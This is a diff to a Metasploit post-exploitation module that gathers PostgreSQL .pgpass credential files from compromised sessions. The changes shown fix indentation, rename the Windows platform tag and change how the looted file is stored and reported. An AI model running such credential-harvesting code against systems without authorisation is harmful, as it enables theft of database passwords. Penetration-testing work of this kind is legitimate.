@@ -10,7 +10,7 @@ class Metasploit3 < Msf::Post
 	include Msf::Post::File
 	include Msf::Post::Common
 	include Msf::Post::Unix
-		include Msf::Post::Windows::UserProfiles
+	include Msf::Post::Windows::UserProfiles
 
 	def initialize(info={})
 		super( update_info(info,
@@ -22,7 +22,7 @@ class Metasploit3 < Msf::Post
 			},
 			'License'		=> MSF_LICENSE,
 			'Author'		 => ['Zach Grace <zgrace[at]403labs.com>'],
-			'Platform'		 => %w[linux bsd unix osx windows],
+			'Platform'		 => %w[linux bsd unix osx win],
 			'SessionTypes'	 => %w[meterpreter shell]
 		))
 	end
@@ -59,7 +59,8 @@ class Metasploit3 < Msf::Post
 		files.each do |f|
 			# Store the loot
 			print_good("Downloading #{f}")
-			store_loot("pgpass.#{f}", "text/plain", session, read_file(f), "#{f}", "pgpass #{f} File")
+			pgpass_path = store_loot("postgres.pgpass", "text/plain", session, read_file(f), "#{f}", "pgpass #{f} file")
+            print_good "Postgres credentials file saved to #{pgpass_path}"
 			# Store the creds
 			parse_creds(f)
 		end
